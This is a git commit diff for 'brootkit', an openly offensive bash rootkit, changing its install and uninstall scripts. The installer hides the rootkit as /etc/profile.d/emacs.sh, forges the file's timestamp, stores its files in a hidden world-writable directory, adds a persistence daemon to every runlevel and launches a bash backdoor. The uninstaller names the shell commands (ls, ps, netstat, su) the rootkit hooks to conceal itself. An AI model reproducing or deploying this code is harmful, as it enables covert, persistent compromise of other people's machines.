976b3fc49210e3c870e9aaf5bc495679f533cbc3
wzt <wzt.wzt@gmail.com>
2015-01-28 00:08:44 +0800

    add os type support.

--- install.sh
+++ install.sh
@@ -2,7 +2,9 @@
 
 BR_ROOTKIT_PATH="/usr/include/..."
 
-function br_rootkit()
+declare br_os_type=0
+
+function br_install_rootkit()
 {
 	cp brootkit.sh /etc/profile.d/emacs.sh
 	touch -r /etc/profile.d/vim.sh /etc/profile.d/emacs.sh
@@ -13,32 +15,94 @@ function br_hookhup()
         :
 }
 
-function main()
+function br_check_os_type()
 {
-	mkdir -p $BR_ROOTKIT_PATH -m 0777
-	[ $? -eq 1 ] && exit && echo "mkdir $BR_ROOTKIT_PATH failed."
+	local line
 
-	cp brootkit.sh br.conf brconfig.sh bashbd.sh brscan.sh $BR_ROOTKIT_PATH
-	[ $? -eq 1 ] && exit && echo "copy brootkit failed."
+	line=`head -n 1 /etc/issue`
+	if echo $line|grep "[Cc]ent[Oo][Ss]" >/dev/null; then
+		br_os_type=1
+	elif echo $line|grep "[Rr]ed.Hat.Enterprise" >/dev/null; then
+		br_os_type=2
+	elif echo $line|grep "[Uu]buntu" >/dev/null; then
+		br_os_type=3
+	else
+		echo -e "target os type: $line is not supported."
+		exit 0
+	fi
+
+	echo -e "target os type: $line"
+	echo $br_os_type
+}
+
+function br_centos_install()
+{
+	local idx
 
 	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
-	ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc3.d/S10brdaemon
-	[ $? -eq 1 ] && exit && echo "copy brdaemon failed."
+	for idx in 0 1 2 3 4 5 6
+	do
+		ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc$idx.d/S10brdaemon
+		[ $? -eq 1 ] && echo "copy brdaemon $idx failed." && exit
+	done
+}
+
+function br_ubuntu_install()
+{
+	local idx
+
+	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
+	for idx in 0 1 2 3 4 5 6
+	do
+		ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc$idx.d/S10brdaemon
+		[ $? -eq 1 ] && echo "copy brdaemon $idx failed." && exit
+	done
+}
+
+function br_creat_home()
+{
+	mkdir -p $BR_ROOTKIT_PATH -m 0777
+	[ $? -eq 1 ] && echo "mkdir $BR_ROOTKIT_PATH failed." && exit
+
+	cp brootkit.sh br.conf brconfig.sh bashbd.sh brscan.sh $BR_ROOTKIT_PATH
+	[ $? -eq 1 ] && echo "copy brootkit failed." && exit
 
 	chmod 777 $BR_ROOTKIT_PATH
+}
 
+function br_install_backdoor()
+{
         if ! type nohup >/dev/null; then
                 nohup $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1
-		[ $? -eq 1 ] && exit && echo "install backdoor failed."
+		[ $? -eq 1 ] && echo "install backdoor failed." && exit
         else
                 trap br_hookhup SIGHUP
                 $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1 &
-		[ $? -eq 1 ] && exit && echo "install backdoor failed."
+		[ $? -eq 1 ] && echo "install backdoor failed." && exit
         fi
+}
 
-	br_rootkit
-	[ $? -eq 1 ] && exit && echo "install brootkit failed." || \
+function main()
+{
+	br_check_os_type
+
+	case $br_os_type in
+		1|2)
+			br_centos_install ;;
+		3)
+			br_ubuntu_install ;;
+	esac
+
+	br_creat_home
+	br_install_backdoor
+	br_install_rootkit
+
+	if [ $? -eq 1 ]; then
+		echo "install brootkit failed."
+		exit
+	else
 		echo "install brootkit successful."
+	fi
 }
 
 main
--- uninstall.sh
+++ uninstall.sh
@@ -1,6 +1,46 @@
 #!/bin/bash
 
-rm -fr /etc/profile.d/emacs.sh
-rm -fr /etc/init.d/brdaemon
-rm -fr /etc/init.d/rc3.d/S10brdaemon
-rm -fr /usr/include/.../
+function uninstall_backdoor()
+{
+	local pid
+
+	for pid in `ps aux|grep bash|grep bashbd | awk '{print $2}'`
+	do
+        	kill -9 $pid
+	done
+}
+
+function uninstall_home()
+{
+	local idx
+
+        for idx in 0 1 2 3 4 5 6
+        do
+		rm -f /etc/rc.d/rc$idx.d/S10brdaemon
+	done
+
+	rm -fr /etc/profile.d/emacs.sh
+	rm -fr /etc/rc.d/init.d/brdaemon
+	rm -fr /usr/include/.../
+}
+
+function uninstall_rootkit()
+{
+	declare -a rootkit_hook=(
+				"declare" "command" "builtin" "set"
+				"fake_unset" "ls" "/bin/ls" "ps"
+				"/bin/ps" "reset_ps" "netstat" "reset_netstat"
+				"/bin/netstat" "type" "typeset" "abcdmagic"
+				"reset_command" "su" "max_file_length"
+				"dir" "/usr/bin/dir"
+				)
+	for hook_cmd in ${rootkit_hook[*]}
+	do
+		unset -f $hook_cmd
+	done
+}
+
+uninstall_rootkit
+uninstall_backdoor
+uninstall_home
+exec /bin/bash
